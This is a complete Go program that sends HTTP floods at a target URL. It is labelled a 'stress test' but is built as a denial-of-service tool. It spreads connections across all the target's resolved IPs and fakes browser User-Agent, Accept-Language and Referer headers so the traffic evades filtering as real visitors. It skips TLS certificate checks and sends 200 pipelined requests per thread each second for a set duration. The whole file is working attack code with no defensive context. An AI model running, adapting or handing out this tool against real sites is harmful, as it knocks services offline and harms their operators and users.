package main

import (
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"net/url"
	"os"
	"strconv"
	"sync"
	"time"
)

var (
	ip            string
	ips           []string // List of resolved IPs for DNS Randomization
	port          int
	path          string
	threads       int
	timer         int
	customHost    string
	httpMethods   = []string{"GET", "POST", "HEAD"} // Random HTTP methods
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

func resolveDNS(hostname string) {
	addrs, err := net.LookupIP(hostname)
	if err != nil {
		fmt.Println("Failed to resolve DNS:", err)
		os.Exit(1)
	}

	for _, addr := range addrs {
		if ipv4 := addr.To4(); ipv4 != nil {
			ips = append(ips, ipv4.String())
		}
	}

	if len(ips) == 0 {
		fmt.Println("No valid IP addresses resolved!")
		os.Exit(1)
	}

	fmt.Printf("Resolved IPs: %v\n", ips)
}

func getUserAgent() string {
	browserVersions := map[string]string{
		"Chrome":  fmt.Sprintf("%d.0.%d.%d", rand.Intn(43)+80, rand.Intn(9999), rand.Intn(999)),
		"Firefox": fmt.Sprintf("%d.0", rand.Intn(50)+70),
		"Safari":  fmt.Sprintf("%d.%d.%d", rand.Intn(200)+400, rand.Intn(10), rand.Intn(10)),
		"Edg":     fmt.Sprintf("%d.%d.%d", rand.Intn(50)+90, rand.Intn(9999), rand.Intn(999)),
	}

	osInfo := map[string]string{
		"Windows":   fmt.Sprintf("Windows NT %d.%d; Win64; x64", 10+rand.Intn(2), rand.Intn(3)),
		"Mac":       fmt.Sprintf("Macintosh; Intel Mac OS X 10_%d_%d", 12+rand.Intn(5), rand.Intn(5)),
		"Linux":     "X11; Linux x86_64",
		"Android":   fmt.Sprintf("Android %d", 10+rand.Intn(5)),
		"iPhone":    fmt.Sprintf("iPhone; CPU iPhone OS %d_%d like Mac OS X", 13+rand.Intn(4), rand.Intn(3)),
		"iPad":      fmt.Sprintf("iPad; CPU OS %d_%d like Mac OS X", 13+rand.Intn(4), rand.Intn(3)),
	}

	devices := []struct {
		typeName string
		models   []string
	}{
		{"Mobile", []string{"Pixel 6", "Galaxy S22", "Xiaomi 12", "iPhone15,2"}},
		{"Tablet", []string{"iPad13,4", "SM-T870", "Pixel Tablet"}},
		{"Desktop", []string{"", "", "", ""}}, // Empty for desktop
	}

	// Select random device type
	deviceType := devices[rand.Intn(len(devices))]
	model := ""
	if deviceType.typeName != "Desktop" && len(deviceType.models) > 0 {
		model = deviceType.models[rand.Intn(len(deviceType.models))] + "; "
	}

	// Select random OS
	var osKeys []string
	for k := range osInfo {
		osKeys = append(osKeys, k)
	}
	selectedOS := osKeys[rand.Intn(len(osKeys))]

	// Select random browser
	var browserKeys []string
	for k := range browserVersions {
		browserKeys = append(browserKeys, k)
	}
	selectedBrowser := browserKeys[rand.Intn(len(browserKeys))]

	return fmt.Sprintf("Mozilla/5.0 (%s%s%s) AppleWebKit/537.36 (KHTML, like Gecko) %s/%s",
		model,
		osInfo[selectedOS],
		func() string {
			if rand.Intn(2) == 0 && deviceType.typeName == "Mobile" {
				return " Mobile"
			}
			return ""
		}(),
		selectedBrowser,
		browserVersions[selectedBrowser],
	)
}

func getHeader(method string) string {
	hostHeader := ip
	if customHost != "" {
		hostHeader = customHost
	}

	languages := []string{
		"en-US,en;q=0.9",
		"en-GB,en;q=0.8",
		"fr-FR,fr;q=0.9",
	}

	header := fmt.Sprintf("%s %s HTTP/1.1\r\n", method, path)
	header += fmt.Sprintf("Host: %s\r\n", hostHeader)
	header += fmt.Sprintf("User-Agent: %s\r\n", getUserAgent())
	header += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
	header += "Accept-Encoding: gzip, deflate\r\n"
	header += fmt.Sprintf("Accept-Language: %s\r\n", languages[rand.Intn(len(languages))])
	header += "Connection: keep-alive\r\n"
	header += "Cache-Control: no-cache\r\n"
	header += fmt.Sprintf("Referer: https://%s\r\n", hostHeader)
	header += "Upgrade-Insecure-Requests: 1\r\n"

	if method == "POST" {
		header += "Content-Length: 0\r\n"
	}

	header += "\r\n"
	return header
}

func worker(id int, wg *sync.WaitGroup, requestCount chan int) {
	defer wg.Done()

	tlsConfig := &tls.Config{InsecureSkipVerify: true, ServerName: ip}
	for count := range requestCount {
		for {
			randomIP := ips[rand.Intn(len(ips))] // Pick a random resolved IP
			address := fmt.Sprintf("%s:%d", randomIP, port)

			var conn net.Conn
			var err error
			if port == 443 {
				conn, err = tls.Dial("tcp", address, tlsConfig)
			} else {
				conn, err = net.Dial("tcp", address)
			}

			if err != nil {
				fmt.Printf("Worker %d: connection error: %v\n", id, err)
				time.Sleep(time.Second)
				continue
			}

			for i := 0; i < count; i++ {
				method := httpMethods[rand.Intn(len(httpMethods))] // Random HTTP method
				header := getHeader(method)
				_, err := conn.Write([]byte(header))
				if err != nil {
					fmt.Printf("Worker %d: write error: %v\n", id, err)
					break
				}
			}
			conn.Close()
			break
		}
	}
}

func main() {
	if len(os.Args) < 4 {
		fmt.Println("Usage: <URL> <THREADS> <TIMER> [CUSTOM_HOST]")
		return
	}

	parsedURL, err := url.Parse(os.Args[1])
	if err != nil {
		fmt.Println("Invalid URL:", err)
		return
	}

	ip = parsedURL.Hostname()
	if parsedURL.Port() != "" {
		port, _ = strconv.Atoi(parsedURL.Port())
	} else if parsedURL.Scheme == "https" {
		port = 443
	} else {
		port = 80
	}

	path = parsedURL.Path
	if path == "" {
		path = "/"
	}

	threads, _ = strconv.Atoi(os.Args[2])
	timer, _ = strconv.Atoi(os.Args[3])
	if len(os.Args) > 4 {
		customHost = os.Args[4]
	}

	resolveDNS(ip)

	fmt.Printf("Starting stress test on %s:%d%s with %d threads for %d seconds\n", ip, port, path, threads, timer)
	if customHost != "" {
		fmt.Printf("Using custom Host header: %s\n", customHost)
	}

	var wg sync.WaitGroup
	requestCount := make(chan int, threads)

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go worker(i, &wg, requestCount)
	}

	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()

		for t := 0; t < timer; t++ {
			<-ticker.C
			for i := 0; i < threads; i++ {
				requestCount <- 200
			}
		}
		close(requestCount)
	}()

	wg.Wait()
	fmt.Println("Stress test completed.")
}
